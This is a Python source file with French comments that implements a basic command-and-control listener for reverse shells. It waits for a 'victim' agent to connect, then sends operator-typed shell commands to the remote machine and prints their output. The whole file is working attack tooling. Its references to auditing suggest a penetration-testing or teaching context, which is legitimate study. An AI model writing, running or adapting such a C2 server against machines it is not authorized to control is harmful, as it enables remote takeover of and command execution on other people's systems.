import socket
import sys

def run_c2(args):
    host = args.listen
    port = args.port

    print(f"[*] Démarrage du Centre de Commandement (C2) sur {host}:{port}")
    print(f"[*] En attente du 'Call Home' d'un agent (Reverse Shell)...")

    # DevSecOps : Utilisation de 'with' pour s'assurer que le socket système 
    # est fermé proprement, même si le programme plante.
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        # Permet de réutiliser le port immédiatement après la fermeture (SO_REUSEADDR)
        # Évite l'erreur classique "Address already in use"
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            s.bind((host, port))
            s.listen(1) # On écoute pour 1 agent à la fois pour cette version basique
            
            # Le script se met en pause ici jusqu'à ce qu'une victime se connecte
            conn, addr = s.accept()
            
            with conn:
                print(f"\n[+] CONNEXION ÉTABLIE ! Agent reçu depuis {addr[0]}:{addr[1]}")
                print("[*] Accès terminal accordé. Tapez 'exit' pour détruire la session.")
                
                while True:
                    # 1. Demander la commande à l'opérateur (vous)
                    command = input("\nC2-Shell> ")
                    
                    if command.strip().lower() == 'exit':
                        conn.sendall(b'exit')
                        break
                    
                    if command.strip() == '':
                        continue
                        
                    # 2. Envoyer la commande à l'agent victime
                    # On encode le texte en octets (bytes) pour le réseau
                    conn.sendall(command.encode('utf-8'))
                    
                    # 3. Recevoir la réponse de l'agent (jusqu'à 4096 octets d'un coup)
                    data = conn.recv(4096)
                    if not data:
                        print("[-] La connexion a été coupée par l'agent.")
                        break
                        
                    # On décode les octets reçus en texte lisible
                    print(data.decode('utf-8', errors='replace'))
                    
        except KeyboardInterrupt:
            print("\n[-] Arrêt du serveur C2 par l'auditeur. Fermeture des ports.")
        except Exception as e:
            print(f"\n[-] Erreur critique du serveur C2 : {e}")